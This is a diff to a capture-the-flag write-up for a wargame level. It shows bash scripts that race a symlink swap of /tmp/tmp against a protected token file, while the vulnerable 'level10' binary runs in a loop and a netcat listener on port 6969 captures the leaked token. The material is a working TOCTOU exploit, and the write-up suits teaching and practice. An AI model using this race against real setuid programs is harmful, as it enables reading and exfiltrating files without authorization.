@@ -79,6 +79,7 @@ nc, ltrace
 ```
 ```b
 # t2
+> touch /tmp/tmp
 > ./level10 /tmp/tmp Localhost
 > Connecting to Localhost:6969 .. Connected!
 Sending file .. wrote file!
@@ -123,34 +124,33 @@ Solution:
 ```b
 #!/bin/bash
 
+rm -rf /tmp/tmp
 t=/tmp/tmp
 
-#timeout 2s bash -c '
 while true; do
   touch $t
   rm -rf $t
   ln -s /home/user/level10/token $t
   rm -rf $t
 done
-#'
-```
 
-- Another script to run `alternate` and `./level10` side by side
+```
 
 `runner.sh`
 
 ```b
 #!/bin/bash
 
-#timeout 2s bash -c '
 while true; do
   /home/user/level10/level10 /tmp/tmp 127.0.0.1 >/dev/null
 done
-#'
 ```
 
-- Run `./alternate.sh` `./runner.sh` and `netcat` at the same time
+- Run `alternate.sh` `runner.sh` and `netcat` at the same time
 
 ```b
-> /tmp/alternate.sh 2>/dev/null & /tmp/runner.sh 2>/dev/null & nc -lk 6969
+> \
+/tmp/alt.sh 2>/dev/null & \
+/tmp/go.sh  2>/dev/null & \
+nc -kl 6969 | grep -v '[][()]'
 ```
